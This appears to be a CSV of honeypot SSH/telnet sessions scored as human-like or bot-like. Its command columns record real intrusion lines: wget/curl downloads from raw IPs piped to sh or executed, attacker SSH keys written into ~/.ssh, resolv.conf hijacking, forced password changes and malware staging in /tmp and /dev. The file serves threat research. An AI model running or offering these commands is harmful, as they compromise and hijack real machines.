session,combo_key,label_pdf_quantile,label_tailtest,label_posterior,p_human_tail,p_human_posterior,n_pairs,n_commands,first_cmd,last_cmd,top_commands,logp_human_global
1da09ec271ab,False_False_False,non_human_like,non_human_like,bot_posterior_high,7.017542161813495e-07,3.338525537676069e-10,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-17.39079007726285
87478fda1ff1,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.7997396441231073e-80,7,9,>/home/.z && cd /home/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i;,wget http://194.31.98.244/ssh/new/x86 -O-> .i; ./.i scan.x86; >.i;,>/home/.z && cd /home/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/.z && cd /; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/tmp/.z && cd /tmp/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/dev/.z && cd /dev/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/var/.z && cd /var/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i; | >/etc/.z && cd /etc/; rm -rf .i; cp /bin/echo .i; >.i; chmod 777 .i;,-186.4682748799693
d24df53ace96,False_False_False,non_human_like,non_human_like,bot_posterior_high,9.314815585526047e-11,2.563587742031828e-16,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-26.73486173172089
234a21040335,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.165291497977299e-55,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.95144296104506
49724f8f5eec,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,7.008680212923032e-41,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-79.18421985524202
467795045ede,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.642359845567113e-43,4,6,sh,wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh,sh | enable | shell | debug shell | cmd | wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh,-92.33159981747116
08161d5b2282,False_False_False,non_human_like,non_human_like,bot_posterior_high,3.6926017799032707e-13,1.6630663042935199e-18,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-32.45497123828289
6fba76f241a5,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.711077765900687e-54,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-109.80599914865104
8d4bc1169d9e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5591339079514469e-63,10,12,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i; ./.i scan.ssh.x86_64; >.i;,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-143.48631397582557
9f8c23a5145e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.411689175791459e-72,8,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i || busybox wget http://109.206.243.207/ssh/x86_64 -O-> .i || wd1 http://1...,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-157.28858254371357
31e87a3149c1,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.759532127720498e-46,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-100.05977153658648
f9e04f766ca6,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5069203996760258e-53,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-107.923532963606
38c00655cdc3,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.207201005826164e-11,3.438746176610293e-17,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-28.852592470022486
bcb0631ee81e,False_False_False,non_human_like,non_human_like,bot_posterior_high,7.438494264988549e-15,1.0981543816155858e-17,3,5,echo -e '\x79\x65\x73\x68\x65\x6c\x6f',cd //; wget http://2.58.149.116/x86_64 -O- > .f; ./.f s.x86_64; >.f; echo test,echo -e '\x79\x65\x73\x68\x65\x6c\x6f' | cat /bin/echo | cat /proc/mounts | cp /bin/echo //.f && >//.f && echo -e '\x67\x6f\x6f\x64\x77\x72\x69\x74\x65' && chmod 777 //.f; echo -e '\x63\x6d\x64\x6... | cd //; wget http://2.58.149.116/x86_64 -O- > .f; ./.f s.x86_64; >.f; echo test,-36.47129492293255
4f5e2df8fe91,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.1102230246251563e-16,2.315253658539534e-19,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-40.94903975234283
22d0f64fdf1d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.306824858330475e-40,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.73107196876569
6d06b5672cf7,True_True_True,human_like,human_like,human_posterior_high,0.7524983026895924,0.9938292034886744,3,4,lscpu,apt update,lscpu | (wget -4 ti.4it.top/setup.sh -O setup.sh || curl -o setup.sh ti.4it.top/setup.sh) && bash setup.sh c0c5372c-202f-4e22-a4... | sudo su | apt update,-1.2816911421272803
3e28820470b7,True_True_True,human_like,human_like,human_posterior_high,0.4645681544100098,0.9311469954664446,12,13,w,ls,w | cat /proc/cpuinfo | w | cat /etc/passwd | ps x | ls -a | cd | cd ..,-2.121398543206513
d19eaa9436bb,True_True_True,human_like,human_like,human_posterior_high,0.4188282852938935,0.9482561783060576,10,11,ifconfig -a,ls -l,ifconfig -a | cat /etc/nas3 | cat /etc/hostname | /usr/bin/yes | 18.157.182.239 | ls /usr/bin | /usr/bin/vmstat | vmstat,-2.280384876264654
ebb026ea146d,True_True_True,human_like,human_like,human_posterior_high,0.5346984175986607,0.9756807697566204,4,5,w,w,w | uname -a | cat /proc/cpuinfo | passwd | w,-1.8971414168661012
51fa2a357e92,True_True_True,human_like,human_like,human_posterior_high,0.1506019688767184,0.9675237418896108,5,6,w,w,w | uname -a | ls | cat /proc/cpuinfo | passwd | w,-3.694457624075467
3fe70d416804,True_True_True,human_like,human_like,human_posterior_high,0.127335213112026,0.9085202957183436,5,6,w,uname -a,w | ls | cat /proc/cpuinfo | nproc | passwd | uname -a,-3.910575505439527
c45d41a91211,True_True_True,human_like,human_like,human_posterior_high,0.6207739209996903,0.9776644166616556,16,19,uptime,cat dscript <<EOF,uptime | uptime | cat /etc/hosts | ls -lrt | which | which uname | hostname | cat /etc/hostname,-1.6443179952777491
605a230627bc,True_True_True,human_like,human_like,human_posterior_high,0.2635423762998395,0.9464574200671356,18,20,unamer -a,cat /etc/poasswd,unamer -a | uname -a | ssh -v | ssh -V | cat /etc/hosts | scp | ls -lrt /usr/bin/ | w,-2.947230588813307
9fb0a0d7ade0,True_True_True,human_like,human_like,human_posterior_high,0.6883674591897915,0.9689089828482784,4,5,w,ps x,w | cat /proc/cpuinfo | passwd | w | ps x,-1.456369726488552
53459e703369,True_True_True,human_like,human_like,human_posterior_high,0.8007595260424095,0.981056274172858,8,9,"echo ""paul cox testing""",exit,"echo ""paul cox testing"" | cat /etc/hostname | echo $hostname | cat hostname | hostname | uname -a | ssh -V | cat etc/hostname",-1.1494964635101352
71d468e1469f,True_True_True,human_like,human_like,human_posterior_high,0.1354458878430435,0.9666143667785396,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | echo Hi | cat -n,-3.831401157057683
d0325f08b21f,True_True_False,human_like,human_like,ambiguous,0.136019697558238,0.386717427069383,39,42,date,ls -l /usr/bin/yes,date | ls -l /usr | ls -l /usr/bin | file | xstat | cat /usr/bin/yes | /usr/bin/yes | ls /usr/bin,-3.825966306421817
20f796c9376a,True_True_False,human_like,human_like,ambiguous,0.2535903887163198,0.4998452255305152,19,22,touch file,uname -a,touch file | ssh admin@23ouywifuhfsdhf | cd ../admin | cd /home/admin | ls -lrt | ps | ps -eaf | ps -fead,-3.000269766137071
61ebdd0a4b36,True_True_False,human_like,human_like,ambiguous,0.4663607003378535,0.8564496881882021,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | echo Hi | cat -n,-2.115397423107834
0645694415d2,True_True_False,human_like,human_like,ambiguous,0.1994834286230908,0.3134801327459654,24,26,curl,history -c,curl | uname -a | curl http://xtibh.com/d/EER6Es | sh | ps aux | ps aux | grep curl | ps aux | mount | uname -a,-3.324967438344713
b269844f934b,True_True_False,human_like,human_like,ambiguous,0.5094034777999725,0.8348261254192633,23,25,cat /etc/rsyslog.conf,ls -l /home/phil,cat /etc/rsyslog.conf | cat /etc/login.defs | history | cat /etc/hosts | cat /etc/hosts | cat /etc/hostname | hostname | find /,-1.9757230705617783
2b058889c060,True_True_False,human_like,human_like,ambiguous,0.1982023960354473,0.8128980004177856,21,25,uname- a,ls -l /etc,uname- a | uname -a | pwd | ls /root | ls /home | id | awk | pwd,-3.3335559149502094
d63a514c15d3,True_True_False,human_like,human_like,ambiguous,0.1059735125224123,0.1251968729029376,4,5,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | echo Hi | cat -n,-4.143853077208314
5222b4b0ad7c,True_True_False,human_like,human_like,ambiguous,0.1980106969445543,0.8779895583202485,8,9,cat /proc/net/arp,pwd,cat /proc/net/arp | ls /proc/net | pwd | cd /proc | ls -l | ifconfig -a | uname -a | mount,-3.334845373842534
2d22c276a3f0,True_True_False,human_like,human_like,ambiguous,0.102025461400095,0.3876967692018913,16,18,w,rm -rf .reload,w | wget | nano | nano aa | ls -a | cd /usr | ls -a | wget https://bashupload.com/4vQyv/reload.tgz,-4.191705670985144
ab4a2a5d7d34,True_True_False,human_like,human_like,ambiguous,0.2129778605228414,0.7240563776538276,13,14,w,ls -a,w | cat /pro/cpuinfo | cat /proc/cpuinfo | uname -a | yum install screen | yum install *lib* | yum update | passwd,-3.237350006497413
53c9d44086cc,False_True_False,uncertain,human_like,ambiguous,0.0677980418282099,0.8501555337667817,7,9,free -m,passwd,free -m | passwd | passwd | passwd | help | clear | git clone https://github.com/vanhauser-thc/thc-hydra | git https://github.com/vanhauser-thc/thc-hydra,-4.699728503826556
c691f2aa053d,False_True_False,uncertain,human_like,bot_posterior_high,0.0644107778997671,0.011432162756986,17,19,cd ~; chattr -ia .ssh; lockr -ia .ssh,df -h | head -n 2 | awk 'FNR == 2 {print $2; }',"cd ~; chattr -ia .ssh; lockr -ia .ssh | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1... | cat /proc/cpuinfo | grep name | wc -l | echo -e ""admin\ngyymh62hAS8k\ngyymh62hAS8k"" | passwd | bash | echo ""admin\ngyymh62hAS8k\ngyymh62hAS8k\n"" | passwd | cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }' | free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | ls -lh $(which ls)",-4.762618773680036
1ca21cbba327,False_True_False,uncertain,human_like,ambiguous,0.0662890294810069,0.5523357127125688,9,11,ls -l,ls -lrt,"ls -l | wget ipinfo.io/ip | cat ip | ls -lrt | ls -l | uname | echo ""."" | while",-4.72736900577097
930021e821f1,False_True_False,uncertain,human_like,bot_posterior_high,0.0503107034004133,0.0962423086689286,4,5,ifconfig,echo Hi | cat -n,ifconfig | uname -a | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | echo Hi | cat -n,-5.063572466417354
888de80e3b84,False_False_True,non_human_like,non_human_like,human_posterior_high,0.0,0.9003953035378822,3,4,id;,help; ?; ; ;,id; | help; ?; ; ; | id; | help; ?; ; ;,-48.222220720032915
cf03edfdfe14,False_False_True,uncertain,non_human_like,human_posterior_high,0.0028563517647601,0.999144530805966,8,9,ls -rlt,nc -vv 107.23.254.247.214 80,ls -rlt | ls -lrt | ls -lrta | touch file | ls -lrt | curl https://www.viessmann.co.uk | nc | nc -vv 208,-8.389546808036252
4f9734961cec,False_False_True,non_human_like,non_human_like,human_posterior_high,2.112754415861673e-12,0.9901442502510416,3,4,ifconfig,echo Hi | cat -n,ifconfig | uname -a | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-30.65473963644871
8c71dc7bc3e8,False_False_True,non_human_like,non_human_like,human_posterior_high,0.0,0.904839786666386,3,4,id;,help; ?; ; ;,id; | help; ?; ; ; | id; | help; ?; ; ;,-46.16802167746739
b8c285cdc6f4,False_True_True,uncertain,human_like,human_posterior_high,0.0643256336656106,0.9907700344083564,3,4,"echo ""paul coxtesting",exit,"echo ""paul coxtesting | echo ""paul cox txtesting"" | cat /etc/hostname | exit",-4.764239717117175
2a67d5b15812,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.814937105297372e-52,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-114.998583836452
792ba473c8a8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5773239532899082e-45,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-101.09858577719532
dca985845b3c,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.493451409398148e-77,9,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i || busybox wget http://109.206.243.207/ssh/x86_64 -O-> .i || wd1 http://1...,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-168.44790969956435
1f49885f065e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.9432162718199156e-72,11,15,sh,wget http://95.214.27.202/x86_64 -O-> .i || busybox wget http://95.214.27.202/x86_64 -O-> .i || wd1 http://95.214.27.202...,"sh | shell | enable | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | mkdir /home/; mount -o remount, rw /home/; cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .... | mkdir /tmp/; mount -o remount, rw /tmp/; cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; ch... | mkdir /var/tmp/; mount -o remount, rw /var/tmp/; cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp... | mkdir /home/$USER/; mount -o remount, rw /home/$USER/; cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/...",-157.08530152585706
b60637083cd8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.644708451505576e-41,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-80.24265316797512
15b67af6983f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.3321595189503461e-51,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-103.22739080932328
40a1a9eeba1e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.173584399235164e-34,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-66.01926405565816
a0e251db304f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.654203589469242e-36,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-68.29275782035643
a4b5b82673c0,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,7.978818884416794e-22,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-42.53809132814292
6cf11c78d01f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.813928223033187e-47,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-94.5060553192065
a2271aa921be,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.3391065865008029e-52,3,5,echo 1 > /dev/null && cat /bin/echo,>A@/1'8ELF7},"echo 1 > /dev/null && cat /bin/echo | nohup $SHELL -c ""curl http://47.239.42.214:60123/linux -o /tmp/nEpLjNjJ9s; if [ ! -f /tmp/nEpLjNjJ9s ]; then wget http:/... | head -c 3800636 > /tmp/CTPl7hzWFZ | nohup $SHELL -c ""curl http://47.239.42.214:60123/linux -o /tmp/nEpLjNjJ9s; if [ ! -f /tmp/nEpLjNjJ9s ]; then wget http:/... | >A@/1'8ELF7}",-118.53410381046947
42a77e00cff6,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.9931006127119053e-43,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-96.29707791622732
f622ad21e3ab,False_False_False,non_human_like,non_human_like,bot_posterior_high,2.910748087003867e-09,5.4484969525698214e-14,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-23.152826753910723
12574832f5e4,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.022884539957996e-22,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-43.68858894409195
5da4c92497e4,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.7500644845552262e-61,5,7,cat /bin/echo,cd /dev; wget http://95.214.27.202/x86 -O- >.f; ./.f ssh.wget.x86; >.f; echo rppr,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x... | cd /dev; wget http://95.214.27.202/x86 -O- >.f; ./.f ssh.wget.x86; >.f; echo rppr,-137.9460323415036
bbdb476cd7b4,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.24046560723158e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.1633186403506
ee6ae8a68923,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.31563671401535e-53,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-106.89494373073752
7cd6070598ef,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,5.815958223931993e-35,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-66.49397706330343
fd50880ee571,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.347620757259611e-56,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-116.902825880955
f2058af20250,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.4784306460873536e-43,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-96.59784307840178
076df683fb13,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.4332869386201573e-50,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-99.81705322324144
8ac4d29a4f3b,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.2772047220859227e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.9834110213839
dc6d0f5101f8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,5.520450170206922e-50,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-99.82126061274808
